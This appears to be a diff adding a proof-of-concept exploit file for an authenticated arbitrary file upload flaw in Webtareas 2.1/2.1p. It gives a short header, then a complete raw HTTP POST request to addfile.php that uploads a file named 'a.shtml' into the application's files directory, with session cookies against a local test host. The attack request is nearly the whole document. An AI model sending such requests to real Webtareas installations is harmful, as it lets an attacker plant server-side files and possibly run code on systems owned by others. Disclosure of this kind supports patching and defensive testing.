@@ -1,0 +1,51 @@
+# Exploit Title: Webtareas 2.1p - Arbitrary File Upload (Authenticated)
+# Author: AppleBois
+# Date: 2020-07-10
+# Exploit author : AppleBois
+# Vendor Hompage:https://sourceforge.net/projects/webtareas/
+# Version: 2.1 && 2.1p
+# Tested on: Window 10 64 bit environment || XAMPP
+# Authenticated User allowed to upload ".exe" and ".shtml" to file uploaded directory
+# More information : https://medium.com/@tehwinsam/webtareas-2-1-c8b406c68c2a
+
+POST /Tareas/webtareas/linkedcontent/addfile.php?doc_type=0&doc_type_ex=&doc_id=1&borne15=0&borne16=0 HTTP/1.1
+Host: 10.10.10.2:81
+Content-Length: 711
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.10.2:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHtJ36OtVyQuyaY6y
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.10.2:81/Tareas/webtareas/linkedcontent/addfile.php?doc_type=0&doc_id=1&borne15=0&borne16=0
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: webTareasSID=vqg1lbhf9g5esjrie84dsrjjhg; ASP.NET_SessionId=vbrb31kd3s5hmz3uobg0smck; UserSettings=language=1; dnn_IsMobile=False; .ASPXANONYMOUS=VA9hDh-1Ldg0FPbBfd9HAWSTqKjasYcZMlHQnpPaoR5WQipK7Q_kKnAlAqfWp0WgtO8HXH2_Tsrhfh-Z7137cng_MeEp3aiMPswVEPZc-UOdZQTp0; __RequestVerificationToken_L0ROTg2=Js5PUWl0BiY3kJLdEPU2oEna_UsEFTrNQiGY986uBwWdRyVDxr2ItTPSUBd07QX6rRyfXQ2; USERNAME_CHANGED=; language=en-US; authentication=DNN; .DOTNETNUKE=CC547735526446773F995D833FACDA646745AE4409516EBF345F1AC725F7D7CE7BFC420BF5EFE9FE2AEC92B04C89CCD2E64C34BA4E195D7D8D6EED7892574DB3FF02599F; ICMSSESSION=mgnp26oubn7hfc590q6j5c9o70
+Connection: close
+
+------WebKitFormBoundaryHtJ36OtVyQuyaY6y
+Content-Disposition: form-data; name="action"
+
+add
+------WebKitFormBoundaryHtJ36OtVyQuyaY6y
+Content-Disposition: form-data; name="file1"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundaryHtJ36OtVyQuyaY6y
+Content-Disposition: form-data; name="attnam1"
+
+a.shtml
+------WebKitFormBoundaryHtJ36OtVyQuyaY6y
+Content-Disposition: form-data; name="atttmp1"
+
+C:/xampp/htdocs/Tareas/webtareas/files/tmpEDE7.tmp
+------WebKitFormBoundaryHtJ36OtVyQuyaY6y
+Content-Disposition: form-data; name="c"
+
+
+------WebKitFormBoundaryHtJ36OtVyQuyaY6y
+Content-Disposition: form-data; name="ver"
+
+1.0
+------WebKitFormBoundaryHtJ36OtVyQuyaY6y--
